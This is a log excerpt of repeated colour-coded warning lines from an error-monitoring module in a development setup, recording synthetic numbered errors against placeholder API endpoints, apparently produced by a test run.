WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816823Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2418'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816871Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2419'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816919Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2420'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.816967Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2421'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817014Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2422'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817062Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2423'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817111Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2424'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817159Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2425'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817206Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2426'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817253Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2427'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817354Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2428'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817425Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2429'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817480Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2430'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817532Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2431'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817582Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2432'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817631Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2433'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817679Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2434'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817732Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2435'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817785Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2436'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817837Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2437'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817891Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2438'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817941Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2439'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.817991Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2440'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818041Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2441'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818091Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2442'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818140Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2443'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818191Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2444'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818245Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2445'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818294Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2446'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818343Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2447'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818390Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2448'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818438Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m49[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2449'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818486Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2450'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818534Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2451'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818582Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2452'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818631Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2453'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818678Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2454'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818726Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2455'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818773Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2456'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.818820Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m50[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 2457'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
